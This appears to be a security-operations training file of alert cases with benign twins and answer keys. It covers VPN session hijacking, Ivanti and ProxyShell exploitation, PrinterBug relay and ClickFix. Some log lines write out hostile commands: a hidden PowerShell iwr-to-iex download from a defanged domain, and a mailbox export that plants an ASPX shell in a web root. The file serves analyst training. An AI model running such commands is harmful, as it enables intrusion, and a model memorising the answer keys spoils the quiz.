# ON SHIFT alerts, drop 3, part 3: network, email and perimeter real-world cases + benign twins (y141-y160)
- id: y141
  d: network
  src: 'Citrix NetScaler Gateway · session log'
  t: 'VPN session token used from a second source IP'
  h: 'vpn-gw01 · m.keller'
  l: ['session established 06:12 from 82.x.x.x (user''s home ISP), SAML sign-in with MFA, endpoint analysis passed, device ID dev-3317', '11:48: same session token presented from 185.x.x.x (hosting ASN, new country), no authentication event, no MFA, no endpoint analysis, no device ID', 'earlier that morning: 40 requests to /oauth/idp/.well-known/openid-configuration with an oversized Host header, responses much larger than usual; gateway build is below the fix for CVE-2023-4966', 'after the switch: the 185.x.x.x source opens RDP bookmarks to 3 file servers the user has never touched']
  v: 1
  x: T1539
  c: vpn-session-ip-change
  k: [1, 2]
  diff: 3
  say: 'A VPN session token reappeared from a hosting network address with no new sign-in; the gateway build predates the vendor fix.'
  tell: 'The shape of CVE-2023-4966: an oversized Host header makes the gateway leak memory, and the leaked session token is already past MFA, so the replay shows no authentication event at all. Second IP, hosting ASN, no posture check, RDP bookmarks nobody uses. Kill the session, because a password reset does nothing.'
  q:
    kind: contain
    ask: 'First action?'
    o: ['Reset the user password and close', 'Kill all active sessions on the gateway, patch, then rotate what they could reach', 'Block 185.x.x.x at the firewall only']
    a: 1
    why: 'A stolen session outlives a password reset. Kill sessions, patch, and rotate credentials the sessions could reach.'
- id: y142
  d: network
  src: 'Citrix NetScaler Gateway · session log'
  t: 'VPN session token used from a second source IP'
  h: 'vpn-gw01 · t.okafor'
  l: ['session established 07:55 from 82.x.x.x (home broadband), SAML sign-in with MFA, endpoint analysis passed, device ID dev-8841', '08:31: same session continues from 37.x.x.x (mobile carrier ASN) after the laptop moved to the user''s phone hotspot; endpoint analysis re-ran and passed, same device ID dev-8841 and client build', 'gateway build includes the fix for CVE-2023-4966; no oversized Host requests to the openid endpoint in the last 30 days', 'traffic after the move: the Outlook and Teams endpoints the session already used, no new bookmarks']
  v: 0
  x: T1539
  c: vpn-session-ip-change
  k: [1, 2]
  diff: 3
  trap: scary
  say: 'A VPN session continued from a mobile carrier address after the laptop moved networks, with the same device ID and a passed posture check.'
  tell: 'Sessions follow people across networks, and this one re-ran endpoint analysis from the new IP and presented the same device ID. The gateway is patched for CVE-2023-4966, nothing oversized hit the openid endpoint, and the traffic is mail and chat the user already had open. Compare a replay with no posture, no device and a hosting ASN.'
- id: y143
  d: network
  src: 'Ivanti Connect Secure · integrity checker'
  t: 'Integrity check result'
  h: 'ics-gw02 · scan: weekly'
  l: ['integrity check: 1 modified CGI under the web auth directory (hash not in the vendor manifest for the installed build) and 1 new file in a temp path', 'web log 3 days earlier: GET /api/v1/totp/user-backup-code/../../license/keys-status/ with a semicolon and a command string, from 185.x.x.x, HTTP 200', 'build is in the range affected by CVE-2023-46805 and CVE-2024-21887; the vendor mitigation XML was never imported', 'appliance egress: HTTPS to 185.x.x.x every 10 min since that hour, the only destination besides its update server and syslog']
  v: 1
  x: T1190
  c: edge-appliance-integrity
  k: [0, 1]
  diff: 3
  say: 'The weekly integrity check found a modified script and a new temp file on a VPN gateway, after a path traversal request days earlier.'
  tell: 'This is the shape of CVE-2023-46805 chained with CVE-2024-21887: auth bypass through a traversal path, command injection, then a modified CGI that survives as an implant. Modified file, matching request three days earlier, and the gateway phoning home. Factory reset and rotate everything the appliance could see.'
  q:
    kind: contain
    ask: 'First action?'
    o: ['Re-run the integrity check and wait for a second result', 'Take the gateway out of service, keep a snapshot, and treat its credentials and sessions as exposed', 'Import the vendor mitigation file and keep the gateway online']
    a: 1
    why: 'Mitigations do not remove an implant. Isolate, preserve evidence, and treat stored credentials and sessions as exposed.'
- id: y144
  d: network
  src: 'Ivanti Connect Secure · integrity checker'
  t: 'Integrity check result'
  h: 'ics-gw04 · scan: weekly'
  l: ['integrity check: 3 modified files and 1 new file under the web root, found 38 min after the platform upgrade', 'all 4 hashes match the vendor manifest for the new build; package signature verified, installed from the admin console on the management VLAN by netops-admin', 'web log: no path traversal requests or command strings in the last 30 days', 'appliance egress: update server and syslog collector only']
  v: 0
  x: T1190
  c: edge-appliance-integrity
  k: [1, 3]
  diff: 3
  trap: scary
  say: 'The integrity check shows three modified files and one new file on a VPN gateway, 38 minutes after an upgrade from the admin console.'
  tell: 'Changed files are what an upgrade does. All four hashes match the vendor manifest for the new build, the package signature verified, and the install came from the admin console on the management VLAN. The bad version is a file the manifest does not know, a probe that landed, and egress to somewhere new.'
- id: y145
  d: network
  src: 'Ivanti Connect Secure · web access log'
  t: 'Path traversal request on VPN appliance'
  h: 'ics-gw04 · 185.x.x.x'
  l: ['GET /api/v1/totp/user-backup-code/../../license/keys-status/ from 185.x.x.x, HTTP 403, 0 bytes returned', 'source is on a published research-scanner list; the same URL hit 6 other external gateways in the last hour', 'build includes the vendor fix for CVE-2023-46805 and CVE-2024-21887, and the mitigation XML; integrity check clean this morning', 'no further requests from the source: no session, no new files, appliance egress unchanged']
  v: 0
  x: T1190
  c: edge-appliance-integrity
  k: [1, 2]
  diff: 2
  trap: scary
  say: 'A path traversal request to the VPN management API from an external address got a 403 on a gateway with the vendor mitigation applied.'
  tell: 'Internet-wide probes for the CVE-2023-46805 traversal path began right after disclosure and never stopped. This one got a 403 from a gateway with the fix and the mitigation, came from a listed research scanner that hit six other gateways, and left no session, file or egress. Probe without a result is noise.'
- id: y146
  d: network
  src: 'NDR · DCE/RPC signatures'
  t: 'Spooler notification RPC seen'
  h: '10.8.4.77 → DC01'
  l: ['signature "MS-RPRN coercion (PrinterBug)": RpcRemoteFindFirstPrinterChangeNotificationEx from 10.8.4.77 to DC01; the notification target in the call is the caller', '2 s later DC01$ authenticates to 10.8.4.77 over SMB with NTLM as the machine account', '10.8.4.77 has no DNS name, CMDB record or EDR agent; DC01 is a domain controller with no printers published', '28 s later: a certificate request for DC01$ reaches the CA web enrollment endpoint from 10.8.4.77 with NTLM authentication (the ESC8 relay pattern)']
  v: 1
  x: T1187
  c: rpc-coercion-source
  k: [1, 3]
  diff: 3
  say: 'An uninventoried host sent a spooler notification call to a domain controller, which authenticated back to it before a certificate request followed.'
  tell: 'Spooler notification RPC aimed at a domain controller is the PrinterBug coercion: DC01$ is tricked into authenticating to the caller, and the caller relays that to AD CS web enrollment (ESC8) for a DC certificate. The callback within seconds and the certificate request from the same unmanaged IP finish the story. Revoke the certificate and close the HTTP enrollment path.'
  q:
    kind: pivot
    ask: 'First pivot?'
    o: ['Check the CA issuance log for certificates issued to DC01$ and revoke them', 'Reboot DC01', 'Disable the print spooler on all workstations']
    a: 0
    why: 'The relayed certificate is the durable credential. Find and revoke it before it is used for a PKINIT logon.'
- id: y147
  d: network
  src: 'NDR · DCE/RPC signatures'
  t: 'Spooler notification RPC seen'
  h: '10.8.7.112 → PRN-SRV-02'
  l: ['signature "MS-RPRN coercion (PrinterBug)": RpcRemoteFindFirstPrinterChangeNotificationEx from 10.8.7.112 to PRN-SRV-02; the notification target in the call is the caller', '10.8.7.112 is WS-FIN-0112, a managed workstation; PRN-SRV-02 is a registered print server hosting 14 printers for 3 subnets', 'the print server answers with ordinary RPC status updates to the client; no SMB machine-account logon, no HTTP or certificate request follows', 'same call from 120 other clients to PRN-SRV-02 this week, each right after a print job or the printer list was opened']
  v: 0
  x: T1187
  c: rpc-coercion-source
  k: [1, 2]
  diff: 3
  trap: scary
  say: 'The same spooler notification call went from a managed finance workstation to a registered print server, which answered with RPC status updates.'
  tell: 'Same signature, boring spooler. Windows print clients register for change notifications with their print server to show job status, and PRN-SRV-02 is a registered print server for three subnets. No DC target, no machine-account callback over SMB, no certificate request. The signature fires on the call, the context decides.'
- id: y148
  d: email
  src: 'Exchange Server · Management log'
  t: 'Mailbox export request created'
  h: 'EX-MBX02 · mailbox: administrator'
  l: ['cmdlet: New-MailboxExportRequest -Mailbox administrator -FilePath \\localhost\c$\inetpub\wwwroot\aspnet_client\error.aspx', 'IIS log minutes earlier: POST /autodiscover/autodiscover.json?@corp.com/powershell from 185.x.x.x; build is in the range of CVE-2021-34473 (ProxyShell)', 'the Mailbox Import Export role was assigned to the calling account 2 min before the cmdlet ran', 'file written under the web root; GET /aspnet_client/error.aspx returned 200 and w3wp.exe spawned cmd.exe']
  v: 1
  x: T1505.003
  c: exchange-export-target
  k: [0, 3]
  diff: 3
  say: 'A mailbox export request wrote an ASPX file into the mail server web root, minutes after a role assignment.'
  tell: 'A PST export is only a file-writing primitive, and ProxyShell used it as one: the PST envelope carries an ASPX body, written under aspnet_client. A role assignment just before, an Autodiscover path trick from the internet, then w3wp spawning cmd on the first hit. Patch, hunt other .aspx files, rotate everything the server could read.'
  q:
    kind: pivot
    ask: 'First pivot?'
    o: ['Search every web root for new .aspx files and review IIS logs for the same Autodiscover pattern', 'Delete error.aspx and close', 'Restart IIS']
    a: 0
    why: 'One shell implies a window of exploitation. Find the others and the timeline before cleaning up.'
- id: y149
  d: email
  src: 'Exchange Server · Management log'
  t: 'Mailbox export request created'
  h: 'EX-MBX02 · mailbox: j.smith'
  l: ['cmdlet: New-MailboxExportRequest -Mailbox j.smith -FilePath \\FS-LEGAL01\pstexports\jsmith_hold.pst', 'caller: CORP\ediscovery-admin through PowerShell remoting from the admin jump host PAW-EX01; the Mailbox Import Export role was assigned 9 days ago through the role-group workflow', 'build is current (security update applied last month); no Autodiscover requests with path tricks in the IIS logs', 'destination is a UNC share on a file server that the Exchange servers were granted for exports; the file is a .pst, not under any web root']
  v: 0
  x: T1505.003
  c: exchange-export-target
  k: [0, 3]
  diff: 3
  trap: scary
  say: 'A mailbox export request wrote a PST to a legal file share from the admin jump host, using a role assigned nine days earlier.'
  tell: 'Same cmdlet, opposite payload. The target is a .pst on a legal file share the Exchange servers were deliberately granted, the caller is an eDiscovery admin from the jump host with a role assigned nine days ago, and IIS shows no path trick. Exports are a legal-hold chore, not a shell, unless the file name ends in .aspx and sits in a web root.'
- id: y150
  d: endpoint
  src: 'EDR · process tree'
  t: 'PowerShell started from the Run dialog'
  h: 'WS-MKT-0307 · lchen'
  l: ['explorer.exe → powershell.exe -w hidden -c "iwr hxxps://cdn-verify[.]help/c.txt -UseBasicParsing | iex", 11 s after a browser tab changed', 'RunMRU holds the same command; the browser process wrote the clipboard 3 s before it was pasted', 'browser history: a "Verify you are human" page on a domain registered 4 days ago, reached from a search ad; the page tells the visitor to press Win+R, Ctrl+V, Enter', 'next: powershell.exe downloads a zip to %TEMP% and starts an unsigned binary from it, then connects to 185.x.x.x:443']
  v: 1
  x: T1204.004
  c: run-dialog-powershell
  k: [0, 1, 2]
  diff: 3
  say: 'PowerShell was started from the Run dialog on a marketing workstation, fetching text from a new domain, eleven seconds after a browser page changed.'
  tell: 'ClickFix: the page does the social engineering and the user does the execution, so there is no attachment and no download for the mail gateway to scan. Pasted command in the Run box, iwr piped to iex, RunMRU matching, clipboard written by the browser seconds earlier. Isolate the host; the unsigned binary is already running.'
  q:
    kind: contain
    ask: 'First action?'
    o: ['Isolate the host and pull the unsigned binary and its network indicators', 'Tell the user to close the browser tab', 'Block cdn-verify[.]help at the proxy and close']
    a: 0
    why: 'The payload already runs. Isolate first, then collect the binary and egress before blocking the domain.'
- id: y151
  d: endpoint
  src: 'EDR · process tree'
  t: 'PowerShell started from the Run dialog'
  h: 'WS-OPS-0412 · mpatel'
  l: ['explorer.exe → powershell.exe -NoProfile -File \\fs-it01.corp.com\selfservice\Reset-TeamsCache.ps1, typed in the Run dialog', 'the script carries an Authenticode signature from the corporate code-signing certificate, and its hash is in the IT script allowlist', 'intranet KB article "Teams will not start" opened 40 s earlier from the internal portal; it lists this exact path', 'the script deletes the Teams cache folder under AppData and restarts Teams; no network egress, no child process beyond Teams']
  v: 0
  x: T1204.004
  c: run-dialog-powershell
  k: [0, 1, 2]
  diff: 2
  trap: scary
  say: 'PowerShell was started from the Run dialog on an operations workstation, running a script from an internal file server after an intranet article was opened.'
  tell: 'Support has been telling people to paste things in the Run box for decades. The difference is the source: an internal file server path, an Authenticode signature from the corporate certificate, and a KB article that lists this exact command and loaded 40 seconds earlier. No iwr, no iex, no internet destination.'
- id: y152
  d: endpoint
  src: 'EDR · process creation'
  t: 'wscript.exe running a JavaScript file'
  h: 'WS-LEG-0188 · rhale'
  l: ['explorer.exe → wscript.exe "C:\Users\rhale\AppData\Local\Temp\Temp1_mutual-nda-template.zip\mutual nda template.js"', 'the zip was downloaded by the browser 40 s earlier from a blog site found through the search "mutual nda template"; no other visit to that site in the browser history', 'the .js is 1.8 MB for a one-page template; no document viewer was opened afterward', 'within 60 s: wscript.exe starts cscript.exe, then powershell.exe, and a scheduled task is created for a JS file in AppData']
